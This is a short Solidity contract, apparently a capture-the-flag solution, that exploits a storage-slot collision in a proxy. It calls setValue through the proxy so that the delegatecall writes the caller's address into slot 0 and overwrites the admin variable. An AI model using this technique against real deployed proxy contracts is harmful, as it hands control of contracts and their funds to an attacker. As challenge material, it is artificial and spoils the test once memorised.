// SPDX-License-Identifier: MIT
pragma solidity ^0.8.33;

import "./Challenge.sol";

contract Solution {
    function solve(Setup setup) external {
        SimpleProxy proxy = setup.proxy();

        // We need to overwrite proxy.admin (slot 0) via delegatecall into LogicV1.value (slot 0).
        // admin is address, so we pack player address into uint256.
        uint256 payload = uint256(uint160(msg.sender));

        bytes memory data = abi.encodeWithSignature("setValue(uint256)", payload);
        (bool ok,) = address(proxy).call(data);
        require(ok, "call failed");
    }
}